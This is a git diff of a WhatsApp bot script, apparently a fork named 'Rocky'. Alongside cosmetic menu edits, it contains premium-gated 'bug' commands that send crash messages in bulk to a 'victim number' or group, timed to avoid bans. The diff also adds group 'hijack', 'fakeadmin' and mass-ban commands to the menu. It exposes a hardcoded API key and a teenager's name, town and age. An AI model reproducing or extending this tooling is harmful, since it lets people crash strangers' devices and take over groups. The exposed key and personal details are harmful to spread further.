@@ -153,7 +153,7 @@ isForwarded: true,
 "title": ` ${global.botname}`,
 "body": `${ownername}`,
 "previewType": "PHOTO",
-"thumbnailUrl": `https://whatsapp.com/channel/0029VammC2VD38CZ8OMdux3f`,
+"thumbnailUrl": ``,
 "thumbnail": fs.readFileSync(`./XeonMedia/thumb.jpg`),
 "sourceUrl": `${link}`}}},
 { quoted: m})
@@ -672,7 +672,7 @@ senddocu(buffer)
             case 'listprem': {
                 if (!isCreator) return replygcxeon(mess.owner)
                 let data = require("./database/premium.json")
-                let txt = `*------🤖 LIST PREMIUM ã€------*\n\n`
+                let txt = `*------ã€Œ LIST PREMIUM ã€------*\n\n`
                 for (let i of data) {
                     txt += `Number : ${i.id}\n`
                     txt += `Expired : ${i.expired} Second\n`         
@@ -1314,7 +1314,7 @@ const repf = await XeonBotInc.sendMessage(from, {
 contacts: { 
 displayName: `${list.length} Contact`, 
 contacts: list }, mentions: [sender] }, { quoted: m })
-XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my Owner `, mentions: [sender]}, { quoted: repf })
+XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner`, mentions: [sender]}, { quoted: repf })
 }
 break
             case 'sticker':
@@ -1406,7 +1406,7 @@ break
                 let webpToMp4 = await webp2mp4File(media)
                 await XeonBotInc.sendMessage(m.chat, {
                     video: {
-                        url: webpTo..result,
+                        url: webpToMp4.result,
                         caption: 'Convert Webp To Video'
                     }
                 }, {
@@ -1439,7 +1439,7 @@ break
                 XeonBotInc.sendMessage(m.chat, {
                     document: audio,
                     mimetype: 'audio/mp3',
-                    fileName: `rocky.mp3`
+                    fileName: `dgxeon.mp3`
                 }, {
                     quoted: m
                 })
@@ -1499,8 +1499,8 @@ break
             break
             case 'emojimix': {
                 let [emoji1, emoji2] = text.split`+`
-                if (!emoji1) return replygcxeon(`Example : ${prefix + command} `)
-                if (!emoji2) return replygcxeon(`Example : ${prefix + command} `)
+                if (!emoji1) return replygcxeon(`Example : ${prefix + command} ðŸ˜…+ðŸ¤”`)
+                if (!emoji2) return replygcxeon(`Example : ${prefix + command} ðŸ˜…+ðŸ¤”`)
                 replygcxeon(mess.wait)
                 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                 for (let res of anu.results) {
@@ -1569,10 +1569,10 @@ break
                 if (args.length < 1) return replygcxeon(`Example:\n${prefix}fliptext Xeony`)
                 quere = args.join(" ")
                 flipe = quere.split('').reverse().join('')
-                replygcxeon(`\`\`\`FLIP TEXT \`\`\`\n *> Normal :*\n${quere}\n*> Flip :*\n${flipe}`)
+                replygcxeon(`\`\`\`ã€Œ FLIP TEXT ã€\`\`\`\n*â€¢> Normal :*\n${quere}\n*â€¢> Flip :*\n${flipe}`)
             }
             break
-            case 'listvn': {
+              case 'listvn': {
                 let teks = '🤖 *List Vn*\n⭕‚\n'
                 for (let x of VoiceNoteXeon) {
                     teks += `ㅤ ${x}\n`
@@ -1636,7 +1636,7 @@ break
                 await fsx.copy(delb, `./XeonMedia/video/${q}.mp4`)
                 fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                 fs.unlinkSync(delb)
-                replygcxeon(`Success Adding Video\n To View Type ${prefix}listvideo`)
+                replygcxeon(`Success Adding Video\To View Type ${prefix}listvideo`)
             }
             break
             case 'delvideo': {
@@ -1682,7 +1682,7 @@ break
                 await fsx.copy(delb, `./XeonMedia/sticker/${q}.webp`)
                 fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                 fs.unlinkSync(delb)
-                replygcxeon(`Successfully Adding Sticker\n To Check Type ${prefix}liststicker`)
+                replygcxeon(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
             }
             break
             case 'delsticker': {
@@ -1752,7 +1752,7 @@ replygcxeon(`Successfully deleted zip ${teks}`)
 break
 case 'listzip': {
 await loading()
-let teksooooo = '🤖 *ZIP LIST* ã€\nâ”‚\n'
+let teksooooo = 'â”Œâ”€â”€â­“ã€Œ *ZIP LIST* ã€\nâ”‚\n'
 for (let x of ZipXeon) {
 teksooooo += `â”‚â­” ${x}\n`
 }
@@ -1793,11 +1793,11 @@ replygcxeon(`Successfully deleted Apk ${teks}`)
 break
 case 'listapk': {
 await loading()
-let teksoooooo = '🤖 *APK LIST* \\n'
+let teksoooooo = 'â”Œâ”€â”€â­“ã€Œ *APK LIST* ã€\nâ”‚\n'
 for (let x of ApkXeon) {
-teksoooooo += ` ${x}\n`
+teksoooooo += `â”‚â­” ${x}\n`
 }
-teksoooooo += `â”‚\n🤖\n\n*Total : ${ApkXeon.length}`
+teksoooooo += `â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â­“\n\n*Total : ${ApkXeon.length}`
 replygcxeon(teksoooooo)
 }
 break
@@ -1834,11 +1834,11 @@ replygcxeon(`Successfully deleted pdf ${teks}`)
 break
 case 'listpdf': {
 await loading()
-let teksoooo = '🤖 *PDF LIST* \n'
+let teksoooo = 'â”Œâ”€â”€â­“ã€Œ *PDF LIST* ã€\nâ”‚\n'
 for (let x of docunye) {
-teksoooo += `🤖${x}\n`
+teksoooo += `â”‚â­” ${x}\n`
 }
-teksoooo += `⭕\n\n*Total : ${docunye.length}*`
+teksoooo += `â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â­“\n\n*Total : ${docunye.length}*`
 replygcxeon(teksoooo)
 }
 break
@@ -2076,11 +2076,11 @@ break
 //bug cases
 case "xandroid": {
   if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxx,5`) 
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxx,5`) 
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replygcxeon("Amount must be a number");
@@ -2101,18 +2101,18 @@ case "xandroid": {
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
     "Successfully Sent Master Rocky BUG To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* âœ…\n\nWait 2 minutes for the Bot is not banned🤖", 
+    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
     [whatsappNumber]
   );
 }
 break;
 case "xios": {
   if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxx,5`) 
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxx,5`) 
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replygcxeon("Amount must be a number");
@@ -2133,7 +2133,7 @@ case "xios": {
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
     "Successfully Sent Master Rocky BUG To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* âœ…\n\nWait 2 minutes for the Bot is not banned🤖", 
+    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
     [whatsappNumber]
   );
 }
@@ -2195,7 +2195,7 @@ case "xios2":
       await sleep(2000); // Adjusted sleep time for clarity
       sendViewOnceMessages(groupTarget, bugAmount);
       await sleep(2500); // Adjusted sleep time for clarity
-      replygcxeon("*DONE… Master Rocky BUG HAS BEEN SENT TO THE GROUP!.*");
+      replygcxeon("*DONEâœ… Master Rocky BUG HAS BEEN SENT TO THE GROUP!.*");
       XeonBotInc.groupLeave(groupTarget);
     } catch (error) {
       replygcxeon(util.format(error));
@@ -2204,11 +2204,11 @@ case "xios2":
   break;
   case "systemuicrash": {
   if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxx,5`) 
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxx,5`) 
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replygcxeon("Amount must be a number");
@@ -2229,18 +2229,18 @@ case "xios2":
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
     "Successfully Sent Master Rocky BUG To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* âœ…\n\nWait 2 minutes for the Bot is not banned🤖", 
+    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
     [whatsappNumber]
   );
 }
 break;
 case "xsysui": {
   if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxx,5`) 
+  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 94xxxxxxxxx,5`) 
+    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return replygcxeon("Amount must be a number");
@@ -2261,7 +2261,7 @@ case "xsysui": {
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
     "Successfully Sent Master Rocky BUG To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* âœ…\n\nWait 2 minutes for the Bot is not banned🤖", 
+    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
     [whatsappNumber]
   );
 }
@@ -2270,28 +2270,28 @@ case 'clearall': {
 if (!isCreator) return replygcxeon(mess.owner)
 XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
 }
-break;
+break
 case 'clearchat':
-xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nChat Cleared!')
+xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Chat Cleared')
 break
-case 'Myinfo':
-xeonimun('*Ｆᴏʀ ＳᴛΔᵀᴜs Ｖɪᴠᴇs "🙇🏻‍♀️❤️🖇️* \n👨🏻‍💻 *Name*: Sithum(Rocky)  \n 🏡 *From*: Anuradhapura   \n 🎂 *Age*: 18 (2006) \n _http://www.tiktok.com/@alone_sithu28_ \n _https://wa.me/message/25CCB2QXLEORJ1_❤️')
+case 'rocky':
+xeonimun('*Send me a message for status view"🙇🏻‍♀️❤️🖇️* \n \n 🖇️_https://wa.me/message/25CCB2QXLEORJ1_\n⭕ *Name* - Rocky💖🧚‍♀️🪄 \n⭕ *From*  - Anuradhapura  🥰💖🏡    \n⭕ *Age* - 18(2006)👀🤍🎂🪄 \n⭕ *Boy* 🐣💫 \n 😘❤️\n _http://www.tiktok.com/@alone_sithu28_ \n ')
 break
-case 'sithum':
-xeonimun('👨🏻‍💻 *Name*:Sithum \n 🏡 *From*: Anuradapura  \n\n 🎂 *Age*: 18   \n _https://wa.me/message/25CCB2QXLEORJ1_ \n_http://www.tiktok.com/@alone_sithu28_ ')
-break
+case 'hey_rocky':
+xeonimun('*Ｆᴏʀ ＳᴛΔᵀᴜs Ｖɪᴠᴇs "🙇🏻‍♀️❤️🖇️* \n⭕ *Name* - Rocky💖🧚‍♀️🪄 \n⭕ *From*  - Anuradhapura  🥰💖🏡    \n⭕ *Age* - 18(2006)👀🤍🎂🪄 \n⭕ *Boy* 🐣💫 \n 😘❤️\n 🖇️  _http://www.tiktok.com/@alone_sithu28_ \n \n 🖇️ _https://wa.me/message/25CCB2QXLEORJ1_  ')
+     break           
 case 'alive':
-xeonimun('👨🏻‍💻 *Name*: Sithum \n 🏡 *From*: Anuradhapura   \n 🎂 *Age*: 18   \n _https://wa.me/message/25CCB2QXLEORJ1_ ')
+xeonimun(' *Hey,I am Online Now.*👨🏻‍💻 \n \n 🖇️ _https://wa.me/message/25CCB2QXLEORJ1_ \n \n 🖇️ _https://whatsapp.com/channel/0029VammC2VD38CZ8OMdux3f_ ')
 break
 case 'ping':
-xeonimun('👨🏻‍💻 *Name*: Sithum \n 🏡 *From*: Anuradapura   \n 🎂 *Age*: 18   \n _https://wa.me/message/25CCB2QXLEORJ_ ')
+xeonimun(' *Ping 10MS*👨🏻‍💻   \n 🖇️ _https://wa.me/message/25CCB2QXLEORJ1_ \n \n 🖇️ _https://whatsapp.com/channel/0029VammC2VD38CZ8OMdux3f_ ')
 break
             case 'menu':
             case 'rockyhelp':
             case 'rockyalive':
             case 'rockybot':
             case 'rockyallmenu':
-                let xeonmenuoh = `Rocky WA BOT ${pushname}
+                let xeonmenuoh = `Rocky ${pushname}
 ${xeonytimewisher}
 
 *Owener Details-*
@@ -2308,15 +2308,16 @@ ${xeonytimewisher}
 > xandroidnumberban
 > systemuicrash
 > xsysui
-
 *Rocky Ios bug 🐛*
 > xios
 > xios2
 > xiosreset
 > xiosnumberban
-
 *Rocky Group bug 🦠*
 > xgc
+> hijack
+> fakeadmin
+> xalladminban
 
 *Owner menu 🔐*
 > getsession
